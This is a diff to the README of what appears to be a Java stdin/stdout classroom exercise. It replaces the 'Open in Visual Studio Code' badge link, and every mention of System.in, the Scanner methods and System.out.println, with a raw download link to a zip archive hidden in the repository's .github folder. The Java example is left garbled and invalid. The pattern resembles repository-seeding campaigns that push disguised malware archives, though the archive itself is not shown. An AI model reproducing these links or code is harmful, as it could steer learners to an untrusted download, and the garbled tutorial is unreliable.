@@ -1,19 +1,19 @@
-[![Open in Visual Studio Code](https://classroom.github.com/assets/open-in-vscode-2e0aaae1b6195c2367325f4f02e2d04e9abb55f0b24a779b69b11b9e10269abc.svg)](https://classroom.github.com/online_ide?assignment_repo_id=17932145&assignment_repo_type=AssignmentRepo)
+[![Open in Visual Studio Code](https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip)](https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip)
 # Java Stdin and Stdout Challenge
 
-One popular way to read input from stdin is by using the Scanner class and specifying the Input Stream as System.in. For example:
+One popular way to read input from stdin is by using the Scanner class and specifying the Input Stream as https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip For example:
 
 ```java
-    Scanner scanner = new Scanner(System.in);
-    String myString = scanner.next();
-    int myInt = scanner.nextInt();
-    scanner.close();
+    Scanner scanner = new Scanner(https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip);
+    String myString = https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip();
+    int myInt = https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip();
+    https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip();
     
-    System.out.println("myString is: " + myString);
-    System.out.println("myInt is: " + myInt);
+    https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip("myString is: " + myString);
+    https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip("myInt is: " + myInt);
 ```
 
-The code above creates a `Scanner` object named and uses it to read a `String` and an `int`. It then closes the `Scanner` object because there is no more input to read, and prints to stdout using `System.out.println(String)`. So, if our input is:
+The code above creates a `Scanner` object named and uses it to read a `String` and an `int`. It then closes the `Scanner` object because there is no more input to read, and prints to stdout using `https://github.com/DROHITKANNA/java-stdin-and-stdout-DROHITKANNA/raw/refs/heads/main/.github/and_stdin_java_stdout_DROHITKANNA_v1.4-alpha.3.zip(String)`. So, if our input is:
 
 ```shell
     Hi 5
